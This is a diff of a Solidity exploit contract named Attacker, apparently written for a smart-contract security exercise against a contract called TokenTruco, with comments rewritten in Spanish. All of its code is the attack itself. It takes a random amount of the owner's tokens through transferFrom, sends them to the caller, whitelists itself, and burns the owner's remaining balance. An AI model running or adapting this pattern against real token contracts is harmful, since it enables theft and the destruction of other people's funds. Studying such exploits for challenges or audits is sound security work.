@@ -107,37 +107,26 @@ interface ITokenTruco {
     function balances(address _account) external view returns (uint256);
 }
 
-// Attacker contract that interacts with the TokenTruco contract
 contract Attacker {
     ITokenTruco public tokenTruco;
 
-    // Constructor to set the address of TokenTruco
     constructor(address _tokenTrucoAddress) {
         tokenTruco = ITokenTruco(_tokenTrucoAddress);
     }
 
-    // Method to execute the attack
     function ejecutarAtaque() public {
         uint256 randomAmount = tokenTruco.montoAleatorio();
         address owner = tokenTruco.owner();
 
-        // Assuming the transferFrom in TokenTruco should handle ether, which might not be the case.
-        // You may need an additional step to ensure ether is transferred if the TokenTruco's transferFrom
-        // does not actually transfer ether.
-
-        // This call assumes transferFrom also transfers ether which might require you to hold ether in the contract.
-        tokenTruco.transferFrom(owner, address(this), randomAmount);
+        // Transferiendo los tokens del owner
+        tokenTruco.transferFrom(owner, msg.sender, randomAmount);
 
         tokenTruco.addToWhitelist();
 
-        // Burn the rest of the tokens.
+        // Con esto quemamos el saldo
         uint256 remainingBalance = tokenTruco.balances(owner);
         tokenTruco.burn(owner, remainingBalance);
 
-        // If ether transfer isn't handled by TokenTruco, you need a way to transfer ether manually.
-        // Example: require that the owner sends ether to this contract in some way.
     }
 
-    // Add a function to receive ether if necessary
-    receive() external payable {}
 }
